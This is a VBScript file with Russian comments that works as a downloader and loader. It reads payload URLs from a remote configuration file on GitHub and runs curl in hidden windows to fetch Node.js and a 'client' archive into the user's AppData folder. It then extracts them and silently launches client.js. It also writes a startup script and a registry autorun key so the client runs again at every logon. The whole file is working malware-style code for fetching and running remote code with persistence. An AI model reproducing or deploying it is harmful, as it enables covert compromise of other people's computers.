Option Explicit
' === Объявляем ВСЕ переменные сразу ===
Dim objShell, objFSO, objHTTP
Dim appData, nodeDir, nodeZip, clientZip, nodeExe, clientJs
Dim nodeZipUrl, clientZipUrl, clientJsUrl, regPath
Dim configUrl, dict, lines, line, key, value
Dim i, success, vbsFile, f
' === Создаём объекты ===
Set objShell = CreateObject("Wscript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")
Set objHTTP  = CreateObject("MSXML2.XMLHTTP")

' === Конфиг URL объявлен ЗДЕСЬ, ошибки не будет ===
configUrl = "https://raw.githubusercontent.com/DaleGelb/files/main/ConfAl.txt"

' === Загружаем конфиг ===
objHTTP.Open "GET", configUrl, False
objHTTP.Send
If objHTTP.Status <> 200 Then
    WScript.Echo "Не удалось загрузить конфиг: " & configUrl
    WScript.Quit
End If

Set dict = CreateObject("Scripting.Dictionary")
lines = Split(objHTTP.ResponseText, vbCrLf)

For Each line In lines
    If Trim(line) <> "" And InStr(line, "=") > 0 Then
        key   = Trim(Split(line, "=")(0))
        value = Trim(Split(line, "=")(1))
        dict(key) = value
    End If
Next

' === Получаем параметры ===
nodeZipUrl   = dict("NODE_ZIP_URL")
clientZipUrl = dict("CLIENT_ZIP_URL")
clientJs     = dict("CLIENT_JS")
regPath      = dict("REG_PATH")

' === Локальные пути ===
appData   = objShell.ExpandEnvironmentStrings("%APPDATA%")
nodeZip   = appData & "\node.zip"
clientZip = appData & "\client.zip"
nodeDir   = appData & "\node-v22.19.0-win-x64"
nodeExe   = nodeDir & "\node.exe"

If Not objFSO.FolderExists(appData) Then objFSO.CreateFolder appData

' === Качаем Node.js с 3 попытками ===
success = False
For i = 1 To 3
    objShell.Run "cmd /c curl -L -o """ & nodeZip & """ " & nodeZipUrl, 0, True
    If objFSO.FileExists(nodeZip) Then
        objShell.Run "cmd /c tar -xf """ & nodeZip & """ -C """ & appData & """", 0, True
        If objFSO.FileExists(nodeExe) Then
            success = True
            objFSO.DeleteFile nodeZip, True
            Exit For
        End If
    End If
    WScript.Sleep 2000
Next

If Not success Then
    WScript.Echo "Не удалось скачать Node.js"
    WScript.Quit
End If

' === Скачиваем клиент ===
objShell.Run "cmd /c curl -L -o """ & clientZip & """ " & clientZipUrl, 0, True
If objFSO.FileExists(clientZip) Then
    objShell.Run "cmd /c tar -xf """ & clientZip & """ -C """ & nodeDir & """", 0, True
    objFSO.DeleteFile clientZip, True
End If

' === Запускаем client.js ===
If objFSO.FileExists(nodeExe) Then
    objShell.Run """" & nodeExe & """ """ & nodeDir & "\" & clientJs & """", 0, False
End If

' === Создаём автозагрузку VBS ===
vbsFile = nodeDir & "\startup.vbs"
Set f = objFSO.CreateTextFile(vbsFile, True)
f.WriteLine "Set sh = CreateObject(""Wscript.Shell"")"
f.WriteLine "q = Chr(34)"
f.WriteLine "cmd = q & """ & nodeExe & """ & q & "" "" & q & """ & nodeDir & "\" & clientJs & """ & q"
f.WriteLine "sh.Run cmd, 0, False"
f.Close

' === Добавляем ключ автозапуска ===
objShell.RegWrite regPath, "wscript.exe """ & vbsFile & """", "REG_SZ"


